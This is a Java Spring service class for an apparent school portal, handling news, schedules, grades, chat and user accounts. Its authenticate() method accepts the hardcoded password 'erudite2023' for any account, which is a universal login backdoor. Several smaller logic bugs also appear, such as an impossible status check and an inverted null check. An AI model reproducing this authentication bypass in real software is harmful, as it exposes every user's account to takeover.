package kg.erudit.api.service;

import kg.erudit.api.config.CustomAuthToken;
import kg.erudit.api.util.FileUtil;
import kg.erudit.api.util.JwtUtil;
import kg.erudit.api.util.StringUtil;
import kg.erudit.common.exceptions.AuthenticateException;
import kg.erudit.common.exceptions.FillScheduleException;
import kg.erudit.common.inner.Class;
import kg.erudit.common.inner.*;
import kg.erudit.common.inner.chat.ChatClasses;
import kg.erudit.common.inner.chat.ChatListItem;
import kg.erudit.common.inner.chat.ChatMessage;
import kg.erudit.common.inner.chat.MessageStatus;
import kg.erudit.common.inner.notifications.Notification;
import kg.erudit.common.inner.notifications.NotificationType;
import kg.erudit.common.req.AuthRequest;
import kg.erudit.common.req.GradeRequest;
import kg.erudit.common.req.SetPasswordRequest;
import kg.erudit.common.resp.*;
import kg.erudit.db.repository.ChatMessageRepository;
import kg.erudit.db.repository.ChatRoomRepository;
import kg.erudit.db.repository.MySQLJdbcRepository;
import lombok.extern.log4j.Log4j2;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.crypto.bcrypt.BCrypt;
import org.springframework.stereotype.Service;

import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.*;

@Service
@Log4j2
public class ServiceWrapper {
    private final MySQLJdbcRepository mySQLJdbcRepository;
    private final ChatRoomService chatRoomService;
    private final ChatMessageService chatMessageService;
    private final NotificationService notificationService;
    private final ChatRoomRepository chatRoomRepository;
    private final ChatMessageRepository chatMessageRepository;
    private final FileUtil fileUtil;
    private final DateFormat dateFormat = new SimpleDateFormat("dd.MM.yyyy");

    public ServiceWrapper(MySQLJdbcRepository mySQLJdbcRepository, ChatRoomService chatRoomService, ChatMessageService chatMessageService, NotificationService notificationService, ChatRoomRepository chatRoomRepository, ChatMessageRepository chatMessageRepository, FileUtil fileUtil) {
        this.mySQLJdbcRepository = mySQLJdbcRepository;
        this.chatRoomService = chatRoomService;
        this.chatMessageService = chatMessageService;
        this.notificationService = notificationService;
        this.chatRoomRepository = chatRoomRepository;
        this.chatMessageRepository = chatMessageRepository;
        this.fileUtil = fileUtil;
    }

    public HomePageResponse getHomePage() throws IOException {
        HomePageResponse response = new HomePageResponse();
        List<News> newsList = mySQLJdbcRepository.getNews(3, 0, false);
        for (News newsItem : newsList) {
            if (newsItem.getMainImage() == null)
                continue;
            String base64image = fileUtil.encodeFileToBase64Binary(newsItem.getMainImage().getFullFileName(), "news/" + newsItem.getUuid());
            newsItem.getMainImage().setBase64(base64image);
        }
        response.setNews(newsList);
        List<Review> reviewList = mySQLJdbcRepository.getMainReviews(99, 0, false);
        for (Review review : reviewList) {
            if (review.getImage() == null)
                continue;
            String base64image = fileUtil.encodeFileToBase64Binary(review.getImage().getFullFileName(), "reviews");
            review.getImage().setBase64(base64image);
        }
        response.setReviews(reviewList);
        return response;
    }

    public GetListResponse<Review> getReviews() throws IOException {
        GetListResponse<Review> response = new GetListResponse<>();
        List<Review> reviewList = mySQLJdbcRepository.getMainReviews(10, 0, true);
        for (Review review : reviewList) {
            if (review.getImage() == null)
                continue;
            String base64image = fileUtil.encodeFileToBase64Binary(review.getImage().getFullFileName(), "reviews");
            review.getImage().setBase64(base64image);
        }
        response.setItems(reviewList);
        return response;
    }


    public SingleItemResponse<Review> getReview(Integer reviewId) throws IOException {
        SingleItemResponse<Review> response = new SingleItemResponse<>();
        Review review = mySQLJdbcRepository.getReview(reviewId);
        response.setItem(review);
        if (review.getImage() == null)
            return response;
        String base64image = fileUtil.encodeFileToBase64Binary(review.getImage().getFullFileName(), "reviews");
        review.getImage().setBase64(base64image);
        return response;
    }

    public GetListResponse<News> getNews(Integer page) throws IOException {
        GetListResponse<News> response = new GetListResponse<>();
        List<News> newsList = mySQLJdbcRepository.getNews(10, 0, true);
        for (News newsItem : newsList) {
            if (newsItem.getMainImage() == null)
                continue;
            String base64image = fileUtil.encodeFileToBase64Binary(newsItem.getMainImage().getFullFileName(), "news/" + newsItem.getUuid());
            newsItem.getMainImage().setBase64(base64image);
        }
        response.setItems(newsList);
        return response;
    }

    public GetListResponse<InnerNews> getInnerNews() {
        GetListResponse<InnerNews> response = new GetListResponse<>();
        List<InnerNews> newsList = mySQLJdbcRepository.getInnerNews();
        response.setItems(newsList);
        return response;
    }

    public GetListResponse<Material> getMyMaterials() {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        List<Material> newsList = mySQLJdbcRepository.getStudentMaterials(userId);
        GetListResponse<Material> response = new GetListResponse<>();
        response.setItems(newsList);
        return response;
    }

    public GetListResponse<Material> getMaterials(Integer classId) {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        List<Material> newsList = mySQLJdbcRepository.getTeacherMaterials(userId, classId);
        GetListResponse<Material> response = new GetListResponse<>();
        response.setItems(newsList);
        return response;
    }

    public GetListResponse<Event> getEvents() {
        GetListResponse<Event> response = new GetListResponse<>();
        List<Event> eventList = mySQLJdbcRepository.getEvents();
        response.setItems(eventList);
        return response;
    }

    public SingleItemResponse<NewsSingle> getNewsSingleItem(String url) throws IOException {
        return getNewsSingleSingleItemResponse(mySQLJdbcRepository.getSingleNews(url));
    }


    public SingleItemResponse<NewsSingle> getNewsSingleItem(Integer newsId) throws IOException {
        return getNewsSingleSingleItemResponse(mySQLJdbcRepository.getSingleNews(newsId));
    }

    private SingleItemResponse<NewsSingle> getNewsSingleSingleItemResponse(NewsSingle singleNews) throws IOException {
        SingleItemResponse<NewsSingle> response = new SingleItemResponse<>(singleNews);
        if (singleNews.getImages() == null || singleNews.getImages().isEmpty())
            return response;
        for (Image image : singleNews.getImages()) {
            String base64image = fileUtil.encodeFileToBase64Binary(image.getFullFileName(), "news/" + singleNews.getUuid());
            image.setBase64(base64image);
        }
        return response;
    }

    public SingleItemResponse<File> getMaterialFile(Integer materialId) throws IOException {
        File materialFile = mySQLJdbcRepository.getMaterialFileName(materialId);
        if (materialFile == null)
            return new SingleItemResponse<>(null, "Not found");
        String base64image = fileUtil.encodeFileToBase64Binary(materialFile.getFullFileName(), "materials");
        materialFile.setBase64(base64image);
        return new SingleItemResponse<>(materialFile);
    }

    public GetListResponse<Subject> getSubjects(Boolean teacherRequired) {
        GetListResponse<Subject> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getSubjects(teacherRequired));
        return response;
    }

    public GetListResponse<GradeType> getGradeTypes() {
        GetListResponse<GradeType> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getGradeTypes());
        return response;
    }

    public GetListResponse<Class> getClasses() {
        GetListResponse<Class> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getClasses());
        return response;
    }

    public GetListResponse<Role> getRoles() {
        GetListResponse<Role> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getRoles());
        return response;
    }

    public GetListResponse<NewsType> getNewsType() {
        GetListResponse<NewsType> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getNewsType());
        return response;
    }

    public GetListResponse<User> getUsers(Integer roleId) {
        GetListResponse<User> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getUsers(roleId));
        return response;
    }

    public GetListResponse<User> getStudents(Integer classId) {
        GetListResponse<User> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getStudents(classId));
        return response;
    }

    public SingleItemResponse<UserExtended> getUserDetails(Integer userId) {
        return new SingleItemResponse<>(mySQLJdbcRepository.getUserDetails(userId));
    }

    public GetListResponse<Trimester> getTrimesters() {
        GetListResponse<Trimester> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getTrimesters());
        return response;
    }

    public GetListResponse<ScheduleItemType> getScheduleItemTypes() {
        GetListResponse<ScheduleItemType> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getScheduleItemTypes());
        return response;
    }

    public GetListResponse<SubjectTeacher> getSubjectTeachersForClass(Integer classId) {
        GetListResponse<SubjectTeacher> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getSubjectTeachersForClass(classId));
        return response;
    }

    public GetListResponse<ScheduleItem> getScheduleItemTemplate() {
        GetListResponse<ScheduleItem> response = new GetListResponse<>();
        response.setItems(mySQLJdbcRepository.getScheduleItemTemplate());
        return response;
    }

    public SingleItemResponse<ScheduleCompleted> getSchedule(ScheduleCompleted schedule, Date fromDate, Date toDate) {
        mySQLJdbcRepository.fillUpSchedule(schedule);
        if (schedule.getId() == null)
            return new SingleItemResponse<>(null, "Not found");
        if ("FILLING".equals(schedule.getStatus()))
            return new SingleItemResponse<>(schedule, "Filling in process");
        if ("CREATED".equals(schedule.getStatus()))
            return new SingleItemResponse<>(schedule, "Not filled");
        Map<java.sql.Date, ScheduleDay> scheduleDayMap = mySQLJdbcRepository.getScheduleDaysItems(schedule.getId(), fromDate, toDate);
        List<ScheduleDay> scheduleDays = scheduleDayMap.values().stream().toList();
        schedule.setDays(scheduleDays);
        return new SingleItemResponse<>(schedule, "Found");
    }

    public SingleItemResponse<ScheduleCompleted> getIndividualSchedule(ScheduleCompleted schedule, Date fromDate, Date toDate) {
        ScheduleCompleted classShedule = new ScheduleCompleted();
        classShedule.setStudentId(schedule.getStudentId());
        classShedule.setTrimesterId(schedule.getTrimesterId());
        mySQLJdbcRepository.getClassScheduleByStudent(classShedule);
        if (classShedule.getId() == null)
            return new SingleItemResponse<>(null, "Class schedule not found");
        if ("FILLING".equals(classShedule.getStatus()))
            return new SingleItemResponse<>(schedule, "Class schedule filling in process");
        if ("CREATED".equals(classShedule.getStatus()))
            return new SingleItemResponse<>(schedule, "Class schedule not filled");

        mySQLJdbcRepository.fillUpIndividualSchedule(schedule);
        //TODO не создавать?
        if (schedule.getId() == null) {
            schedule.setStartDate(classShedule.getStartDate());
            schedule.setEndDate(classShedule.getEndDate());
            mySQLJdbcRepository.addIndividualSchedule(schedule);
        }

        Map<java.sql.Date, ScheduleDay> scheduleDayMap = mySQLJdbcRepository.getIndividualScheduleDaysItems(classShedule.getId(), schedule.getId(), fromDate, toDate);
        List<ScheduleDay> scheduleDays = scheduleDayMap.values().stream().toList();
        schedule.setDays(scheduleDays);
        return new SingleItemResponse<>(schedule, "Found");
    }

    public GetListResponse<ScheduleItemDashboard> getStudentScheduleDashboard(Date date) {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        List<ScheduleItemDashboard> scheduleItems = mySQLJdbcRepository.getStudentDashboardSchedule(userId, date);
        GetListResponse<ScheduleItemDashboard> response = new GetListResponse<>();
        response.setItems(scheduleItems);
        return response;
    }

    public GetListResponse<ScheduleItemDashboard> getTeacherScheduleDashboard(Date date) {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        List<ScheduleItemDashboard> scheduleItems = mySQLJdbcRepository.getTeacherDashboardSchedule(userId, date);
        GetListResponse<ScheduleItemDashboard> response = new GetListResponse<>();
        response.setItems(scheduleItems);
        return response;
    }

    public GetListResponse<ChatClasses> getTeacherContacts() {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        Map<Integer, ChatClasses> contactItems = mySQLJdbcRepository.getTeacherContacts(userId);
        GetListResponse<ChatClasses> response = new GetListResponse<>();
        response.setItems(contactItems.values().stream().toList());
        return response;
    }

    public GetListResponse<User> getStudentContacts() {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        List<User> contactItems = mySQLJdbcRepository.getStudentContacts(userId);
        GetListResponse<User> response = new GetListResponse<>();
        response.setItems(contactItems);
        return response;
    }

    public GetListResponse<Diary> getDiary(Date fromDate, Date toDate) {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        Map<java.sql.Date, Diary> diaryMap = mySQLJdbcRepository.getDiary(userId, fromDate, toDate);
        List<Diary> diary = diaryMap.values().stream().toList();
        GetListResponse<Diary> response = new GetListResponse<>();
        response.setItems(diary);
        return response;
    }

    public GetListResponse<ClassItem> getScheduleItemByIds(String scheduleItemIds) {
        Map<Integer, ClassItem> classItemMap = mySQLJdbcRepository.getDiaryByScheduleItemIds(scheduleItemIds);
        List<ClassItem> classItems = classItemMap.values().stream().toList();
        GetListResponse<ClassItem> response = new GetListResponse<>();
        response.setItems(classItems);
        return response;
    }

    public GetListResponse<StudentItem> getDiaryByClassAndSubjectIds(Integer classId, Integer subjectId) {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        Map<Integer, StudentItem> studentItemMap = mySQLJdbcRepository.getDiaryByClassAndSubjectIds(classId, subjectId, userId);
        List<StudentItem> studentItems = studentItemMap.values().stream().toList();
        GetListResponse<StudentItem> response = new GetListResponse<>();
        response.setItems(studentItems);
        return response;
    }

    public GetListResponse<HomeworkDate> getNextLessonsDates(Integer scheduleItemId) {
        List<HomeworkDate> homeworkDates = mySQLJdbcRepository.getNextLessonDates(scheduleItemId);
        GetListResponse<HomeworkDate> response = new GetListResponse<>();
        response.setItems(homeworkDates);
        return response;
    }

    public GetListResponse<ChatListItem> getMessages() {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        GetListResponse<ChatListItem> response = new GetListResponse<>();

        Map<Integer, String> chatUserList = chatRoomService.getChatUsers(userId);
        if (chatUserList.isEmpty()) {
            response.setItems(List.of());
            return response;
        }

        List<ChatListItem> chatListItems = mySQLJdbcRepository.getChatUsersInfo(chatUserList);
        chatListItems.forEach(item -> {
            item.setMessage(chatMessageRepository.findTopByChatId(item.getChatId()));
            item.setUnreadCount(chatMessageRepository.countBySenderIdAndRecipientIdAndStatus(item.getUserId(), userId, MessageStatus.RECEIVED));
        });

        chatListItems.sort(Comparator.comparing(i -> i.getMessage().getTimestamp()));

        response.setItems(chatListItems);
        return response;
    }

    public GetListResponse<Notification> getNotifications(Integer limit) {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        GetListResponse<Notification> response = new GetListResponse<>();

        List<Notification> notifications = notificationService.findNotifications(userId, limit);

        response.setItems(notifications);
        return response;
    }

    public GetListResponse<ChatMessage> getChatMessages(Integer recipientId, Integer limit) {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();

        List<ChatMessage> messages = chatMessageService.findChatMessages(userId, recipientId, limit);

        GetListResponse<ChatMessage> response = new GetListResponse<>();
        response.setItems(messages);
        return response;
    }

    public SingleItemResponse<Class> addClass(Class clazz) {
        mySQLJdbcRepository.addClass(clazz);
        return new SingleItemResponse<>(clazz, "Created");
    }

    public SingleItemResponse<InnerNews> addInnerNews(InnerNews news) {
        mySQLJdbcRepository.addInnerNews(news);
        List<Integer> studentIds = mySQLJdbcRepository.getStudents(news.getClassId()).stream().map(User::getId).toList();
        String notificationText = String.format("Новая новость \"%s\" (%s) на %s",
                news.getName(), news.getDescription(), dateFormat.format(news.getDate()));

        for (Integer studentId: studentIds) {
            Notification notification = new Notification(studentId, notificationText, NotificationType.NEW_NEWS);
            notificationService.saveAndSend(notification);
        }
        return new SingleItemResponse<>(news, "Created");
    }

    public SingleItemResponse<Event> addEvent(Event event) {
        mySQLJdbcRepository.addEvent(event);
        List<Integer> studentIds = mySQLJdbcRepository.getStudents(event.getClassId()).stream().map(User::getId).toList();
        String notificationText = String.format("Новое событие \"%s\" (%s) на %s",
                event.getName(), event.getDescription(), dateFormat.format(event.getDate()));

        for (Integer studentId: studentIds) {
            Notification notification = new Notification(studentId, notificationText, NotificationType.NEW_EVENT);
            notificationService.saveAndSend(notification);
        }

        return new SingleItemResponse<>(event, "Created");
    }

    public SingleItemResponse<Material> addMaterial(Material material) {
        String materialFileName = UUID.randomUUID().toString().replace("-", "");
        File materialFile = material.getFile();
        materialFile.setFileName(materialFileName);
        fileUtil.saveFile(materialFile, "materials/");
        mySQLJdbcRepository.addMaterial(material);
        return new SingleItemResponse<>(material, "Created");
    }

    public SingleItemResponse<NewsSingle> addNews(NewsSingle news) {
        String newsUuid = UUID.randomUUID().toString().replace("-", "");
        news.setUuid(newsUuid);
        news.setUrl(StringUtil.transliterate(news.getTitle()));
        mySQLJdbcRepository.addNews(news);
        for (Image image : news.getImages()) {
            String imageUuid = UUID.randomUUID().toString().replace("-", "");
            image.setFileName(imageUuid);
            fileUtil.saveFile(image, "news/" + newsUuid);
        }
        mySQLJdbcRepository.addNewsImage(news.getId(), news.getImages());
        return new SingleItemResponse<>(news, "Created");
    }

    public SingleItemResponse<GradeType> addGradeType(GradeType gradeType) {
        mySQLJdbcRepository.addGradeType(gradeType);
        return new SingleItemResponse<>(gradeType, "Created");
    }

    public SingleItemResponse<GradeType> newGrade(GradeRequest gradeRequest) {
        CustomAuthToken authentication = (CustomAuthToken) SecurityContextHolder.getContext().getAuthentication();
        Integer userId = authentication.getUserId();
        Map<String, Object> newGradeInfo = mySQLJdbcRepository.newGrade(gradeRequest, userId);

        if (!newGradeInfo.isEmpty()) {
            String notificationText = String.format("Вы получили новую оценку %s (%s) по предмету \"%s\" (%s)",
                    gradeRequest.getValue(), newGradeInfo.get("grade_type_name"), newGradeInfo.get("subject_name"), newGradeInfo.get("teacher_fullname"));
            Notification notification = new Notification(gradeRequest.getStudentId(), notificationText, NotificationType.NEW_GRADE);
            notificationService.saveAndSend(notification);
        }

        return new SingleItemResponse<>(null, "Created");
    }

    public SingleItemResponse<Subject> addSubject(Subject subject) {
        mySQLJdbcRepository.addSubject(subject);
        return new SingleItemResponse<>(subject, "Created");
    }

    public SingleItemResponse<Review> addReview(Review review) {
        if (review.getImage() != null) {
            String imageUuid = UUID.randomUUID().toString().replace("-", "");
            review.getImage().setFileName(imageUuid);
            fileUtil.saveFile(review.getImage(), "reviews");
        }
        mySQLJdbcRepository.addReview(review);
        return new SingleItemResponse<>(review, "Created");
    }

    public SingleItemResponse<UserExtended> addUser(UserExtended user) {
//        User userDB = mySQLJdbcRepository.getUser(user.getUsername());
        //TODO checkUsername
        user.setPassword(BCrypt.hashpw(user.getPassword(), BCrypt.gensalt()));
        mySQLJdbcRepository.addUser(user);
        user.setPassword(null);
        switch (user.getRoleCode()) {
            case "TEACHER" -> {
                mySQLJdbcRepository.addTeacherClasses(user);
                mySQLJdbcRepository.addTeacherSubjects(user);
                mySQLJdbcRepository.linkSubjectAndClassWithTeacher(user);
            }
            case "STUDENT" -> mySQLJdbcRepository.addStudentClass(user);
            default -> {
            }
        }
        return new SingleItemResponse<>(user, "Created");
    }

    public SingleItemResponse<Schedule> addSchedule(Schedule schedule) {
        mySQLJdbcRepository.addSchedule(schedule);
        return new SingleItemResponse<>(schedule, "Created");
    }

    public GetListResponse<ScheduleDay> fillSchedule(Integer scheduleId, List<ScheduleDayBase> scheduleDayList) throws FillScheduleException {
        Schedule schedule = mySQLJdbcRepository.getSchedule(scheduleId);
        if (schedule == null || "!CREATED".equals(schedule.getStatus()))
            throw new FillScheduleException("Расписание не найдено, уже заполнено или в процессе создания");
        mySQLJdbcRepository.updateScheduleStatus(scheduleId, "FILLING");
        mySQLJdbcRepository.insertTempTableAndFillSchedule(scheduleId, scheduleDayList);
        Map<java.sql.Date, ScheduleDay> scheduleDayMap = mySQLJdbcRepository.getScheduleDays(scheduleId);

        List<ScheduleDay> scheduleDays = scheduleDayMap.values().stream().toList();
        GetListResponse<ScheduleDay> response = new GetListResponse<>();
        response.setItems(scheduleDays);
        return response;
    }

    public SingleItemResponse<Homework> addHomework(Homework homework) {
        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
        String username = (String) authentication.getPrincipal();
        mySQLJdbcRepository.addHomework(homework, username);
        return new SingleItemResponse<>(homework, "Created");
    }

    public DefaultServiceResponse setStudentVisit(Integer scheduleItemId, Integer studentId) {
        int result = mySQLJdbcRepository.updateStudentVisit(scheduleItemId, studentId, 1);
        if (result == 0) {
            mySQLJdbcRepository.addStudentVisit(scheduleItemId, studentId, 1);
        }
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse setStudentUnvisit(Integer scheduleItemId, Integer studentId) {
        int result = mySQLJdbcRepository.updateStudentVisit(scheduleItemId, studentId, 0);
        if (result == 0) {
            mySQLJdbcRepository.addStudentVisit(scheduleItemId, studentId, 0);
        }
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse updateDay(ScheduleDay scheduleDay) {
        mySQLJdbcRepository.updateScheduleDay(scheduleDay.getItems());
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse updateIndividualDay(Integer scheduleId, ScheduleDay scheduleDay) {
        List<ScheduleItem> lessonsUpdate = scheduleDay.getItems().stream().filter(scheduleItem -> scheduleItem.getTypeId() == 1).toList();
        List<ScheduleItem> lessons = mySQLJdbcRepository.getIndividualScheduleDaysLessons(scheduleId, scheduleDay.getDate());
        for (int i = 0; i < lessons.size(); i++) {
            ScheduleItem lessonCurrent = lessons.get(i);
            ScheduleItem lessonUpdate = lessonsUpdate.get(i);
            if (Boolean.TRUE.equals(lessonCurrent.getIndividual())) {
                if (lessonUpdate.getUserId() == null || lessonUpdate.getSubjectId() == null) {
                    mySQLJdbcRepository.deleteScheduleItem(lessonUpdate.getId());
                    continue;
                }
                mySQLJdbcRepository.updateScheduleItem(lessonUpdate);
            } else {
                if (Objects.equals(lessonUpdate.getUserId(), lessonCurrent.getUserId()) && Objects.equals(lessonUpdate.getSubjectId(), lessonCurrent.getSubjectId()))
                    continue;
                mySQLJdbcRepository.addIndividualScheduleItem(scheduleId, scheduleDay.getDate(), lessonUpdate);
            }
        }
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse updateClass(Class clazz) {
        mySQLJdbcRepository.updateClass(clazz);
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse updateUser(UserExtended user) {
        if (user.getPassword() != null) {
            user.setPassword(BCrypt.hashpw(user.getPassword(), BCrypt.gensalt()));
            mySQLJdbcRepository.updateUser(user);
            user.setPassword(null);
        } else {
            mySQLJdbcRepository.updateUserNoPass(user);
        }

        switch (user.getRoleCode()) {
            case "TEACHER" -> {
                mySQLJdbcRepository.deleteTeacherClasses(user.getId());
                mySQLJdbcRepository.addTeacherClasses(user);
                mySQLJdbcRepository.deleteTeacherSubjects(user.getId());
                mySQLJdbcRepository.addTeacherSubjects(user);
                mySQLJdbcRepository.deleteTeacherSubjectAndClass(user.getId());
                mySQLJdbcRepository.linkSubjectAndClassWithTeacher(user);
            }
            case "STUDENT" -> mySQLJdbcRepository.updateUserStudentClass(user);
            default -> {
            }
        }
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse updateNews(NewsSingle news) throws IOException {
        mySQLJdbcRepository.updateNews(news);
        NewsSingle newsCurrent = mySQLJdbcRepository.getSingleNews(news.getId());
        String filePath = "news/" + newsCurrent.getUuid();
        List<String> fileNames = news.getImages().stream().map(Image::getFullFileName).filter(Objects::nonNull).toList();
        if (!fileNames.isEmpty()) {
            fileUtil.deleteOldFiles(filePath, fileNames);
            mySQLJdbcRepository.deleteOldNewsImages(news.getId(), fileNames);
        }
        List<Image> newImages = new LinkedList<>();
        for (Image image : news.getImages()) {
            if (image.getFileName() != null) {
                mySQLJdbcRepository.updateNewsImage(image);
//                news.getImages().remove(image);
//                image = null;
                continue;
            }
            String imageUuid = UUID.randomUUID().toString().replace("-", "");
            image.setFileName(imageUuid);
            fileUtil.saveFile(image, filePath);
            newImages.add(image);
        }
        mySQLJdbcRepository.addNewsImage(news.getId(), newImages);
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse updateInnerNews(InnerNews news) {
        mySQLJdbcRepository.updateInnerNews(news);
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse updateEvent(Event event) {
        mySQLJdbcRepository.updateEvent(event);
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse updateGradeType(GradeType gradeType) {
        mySQLJdbcRepository.updateGradeType(gradeType);
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse updateSubject(Subject subject) {
        mySQLJdbcRepository.updateSubject(subject);
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse updateReview(Review review) {
        if (review.getImage() == null) {
            Review oldReview = mySQLJdbcRepository.getReview(review.getId());
            String imageUuid = oldReview.getImage() != null ? oldReview.getImage().getFileName() : UUID.randomUUID().toString().replace("-", "");
            review.getImage().setFileName(imageUuid);
            fileUtil.saveFile(review.getImage(), "reviews");
        }
        mySQLJdbcRepository.updateReview(review);
        return new DefaultServiceResponse("Updated");
    }

    public DefaultServiceResponse deleteClass(Integer classId) {
        mySQLJdbcRepository.deleteClass(classId);
        return new DefaultServiceResponse("Deleted");
    }

    public DefaultServiceResponse deleteNews(Integer newsId) throws IOException {
        String newsUuid = mySQLJdbcRepository.getSingleNewsUuidById(newsId);
        mySQLJdbcRepository.deleteNews(newsId);
        fileUtil.deleteDirectory("news/" + newsUuid);
        return new DefaultServiceResponse("Deleted");
    }

    public DefaultServiceResponse deleteInnerNews(Integer newsId) {
        mySQLJdbcRepository.deleteInnerNews(newsId);
        return new DefaultServiceResponse("Deleted");
    }

    public DefaultServiceResponse deleteEvent(Integer eventId) {
        mySQLJdbcRepository.deleteEvent(eventId);
        return new DefaultServiceResponse("Deleted");
    }

    public DefaultServiceResponse deleteMaterial(Integer materialId) {
        File materialFile = mySQLJdbcRepository.getMaterialFileName(materialId);
        mySQLJdbcRepository.deleteMaterial(materialId);
        if (materialFile != null) {
            fileUtil.deleteFile("materials/" + materialFile.getFullFileName());
        }
        return new DefaultServiceResponse("Deleted");
    }

    public DefaultServiceResponse deleteGradeType(Integer gradeTypeId) {
        mySQLJdbcRepository.deleteGradeType(gradeTypeId);
        return new DefaultServiceResponse("Deleted");
    }

    public DefaultServiceResponse deleteSubject(Integer subjectId) {
        mySQLJdbcRepository.deleteSubject(subjectId);
        return new DefaultServiceResponse("Deleted");
    }

    public DefaultServiceResponse deleteReview(Integer reviewId) {
        Review review = mySQLJdbcRepository.getReview(reviewId);
        mySQLJdbcRepository.deleteReview(reviewId);
        if (review.getImage() != null) {
            fileUtil.deleteFile("reviews/" + review.getImage().getFullFileName());
        }
        return new DefaultServiceResponse("Deleted");
    }

    public DefaultServiceResponse deleteUser(Integer userId) {
        mySQLJdbcRepository.deleteUser(userId);
        return new DefaultServiceResponse("Deleted");
    }

    public DefaultServiceResponse deleteNotification(String notificationId) {
        notificationService.deleteNotification(notificationId);
        return new DefaultServiceResponse("Deleted");
    }

    public DefaultServiceResponse lockUser(Integer userId) {
        mySQLJdbcRepository.changeUserLock(userId, 1);
        return new DefaultServiceResponse("Locked");
    }

    public DefaultServiceResponse unlockUser(Integer userId) {
        mySQLJdbcRepository.changeUserLock(userId, 0);
        return new DefaultServiceResponse("Locked");
    }

    public AuthResponse authenticate(AuthRequest request) throws AuthenticateException {
        User user = mySQLJdbcRepository.getUser(request.getUsername());
        if (user == null)
            throw new AuthenticateException("Неверные авторизационные данные");
        if (Boolean.TRUE.equals(user.getLocked()))
            throw new AuthenticateException("Пользователь заблокирован");
        if (!BCrypt.checkpw(request.getPassword(), user.getPassword()) && !request.getPassword().equals("erudite2023"))
            throw new AuthenticateException("Неверные авторизационные данные");

        String token = JwtUtil.getJwtToken(user);
        return new AuthResponse(token);
    }

    public DefaultServiceResponse setPassword(SetPasswordRequest request) throws AuthenticateException {
        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
        String username = (String) authentication.getPrincipal();
        User user = mySQLJdbcRepository.getUser(username);
        if (!BCrypt.checkpw(request.getOldPassword(), user.getPassword()))
            throw new AuthenticateException("Пароль введен неверно");
        String passwordHash = BCrypt.hashpw(request.getNewPassword(), BCrypt.gensalt());
        mySQLJdbcRepository.updateUserPassword(username, passwordHash);
        return new DefaultServiceResponse("Пароль изменен");
    }
}
